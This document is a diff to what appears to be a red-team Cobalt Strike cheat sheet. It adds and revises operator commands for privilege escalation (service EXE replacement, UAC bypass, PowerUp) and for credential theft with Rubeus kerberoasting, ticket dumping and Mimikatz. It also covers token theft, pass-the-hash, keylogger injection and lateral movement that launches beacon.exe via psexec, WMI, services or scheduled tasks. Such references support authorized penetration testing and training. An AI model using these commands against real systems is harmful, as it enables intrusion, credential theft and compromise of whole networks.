@@ -277,6 +277,10 @@ sleep 0                                           Make a Beacon interactive
 sleep 10                                          Make a Beacon call home every 10 seconds
 sleep 90 10                                       Make a Beacon call home every 90 seconds with a 10% jitter
 
+- Jobs
+jobs                                              Show running jobs
+kill <JID>                                        Kill a specific job
+
 - Misc
 Use the up arrow to scroll through previous commands.
 Beacon is fully tab-completable.
@@ -309,8 +313,8 @@ screenshot <PID> x64                              Take a screenshot (look for sv
 
 keylogger <PID> x64                               Inject a keystroke logger into a process (look for svchost from the current user)
                                                   View > Keystrokes
-
-portscan 10.0.0.1-10.0.0.255 22,80,443,445,1433,3389 none 255
+sleep
+portscan <target range> <ports> none 255
 Go to the Targets tab, select all the targets > right-click > Services
 
 Beacon Command Behavior and OPSEC Considerations
@@ -330,22 +334,28 @@ Select each line > Kill                           Remove any Scripted Payload De
 
 - Built in
 getsystem                                         SYSTEM account impersonation using named pipes
-elevate svc-exe                                   Creates a SYSTEM service that will run our payload
-elevate uac-token-duplication                     Bypass UAC, this gives you a pseudo-high integrity token
+elevate svc-exe                                   Select your Beacon. Creates a SYSTEM service that will run our payload
+elevate uac-token-duplication                     Select your Beacon. Bypass UAC, this gives you a pseudo-high integrity token
 
 run wmic service get name, pathname               Check for unquoted service paths
 
+- PowerUp
+powershell-import /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
+powershell Invoke-PrivescAudit                    Look for a vulnerable service
+Attacks > Packages > Windows Executable (S)       Output: Windows Service EXE
+upload /path/to/new/exe
+run sc start <vulnerable service>
+
 - Seatbelt
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe powershell
 execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=system
 execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=user
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q TokenGroups
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q InterestingProcesses
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q KeePass
 
 - SharpUp
 execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/SharpUp.exe audit
-
-- PowerShell weaponization
-powershell <cmdlet> <args>                        Starts powershell.exe and uses the highest supported PowerShell version
-powerpick <cmdlet> <args>                         Spawns a sacrificial process specified by spawnto and injects UnmanagedPowerShell into it
-psinject <PID> <arch> <cmdlet> <args>             Injects UnmanagedPowerShell into the specified process
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Credential Abuse
@@ -359,19 +369,19 @@ execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe LSASetti
 execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q SecPackageCreds
 
 execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Rubeus.exe dump
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Rubeus.exe logonsession
 
 - Kerberoasting
 execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Rubeus.exe kerberoast /outfile:hashes.txt
 
-- Double-hop workarounds
-1. Use a token that points to a non-network logon session
+- Double-hop problem
 steal_token <PID>
-inject <PID> x64 <listener>
-
-2. Create a new token and logon session that has creds
-make_token <domain\user> <password>
-spawnas <domain\user> <password> <listener>
+inject <PID> <x86|x64> <listener>
+make_token <domain\user> <password>               Plaintext cred preference
 pth <domain\user> <hash>
+spawnas <domain\user> <password> <listener>
+Using Rubeus to request/apply a new ticket
+kerberos_ticket_use (with an existing ticket)
 
 - Mimikatz
 ::                                                Show parent modules
@@ -392,20 +402,13 @@ lsadump::<module>                                 Interact with the Local Securi
 
 make_token <domain\user> <password>
 ls \\<computer>\C$                                Check to see if you have access
-jump <psexec, psexec64, winrm, winrm64> <computer> <listener>
+jump <psexec, psexec64, psexec_psh, winrm, winrm64> <computer> <listener>
 
 schtasks /create /s <IP> /tn <name> /u <user> /sc <frequency> /p <password> /st <time> /sd <date> <command>
 sc \\IP create Service binPath= "command"
 wmic /node:target.domain process call create "C:\Windows\System32\cmd.exe /c beacon.exe"
 
 jump wmi_msbuild <target> <listener>
-
-- Double-hop options
-make_token <domain\user> <password>
-inject <PID> x64 <listener>
-steal_token <PID>
-pth <domain\user> <hash>
-spawnas <domain\user> <password> <listener>
 
 socks <port>                                      Opens a port on the team server. Be sure to restrict access
 proxychains <tool/options>
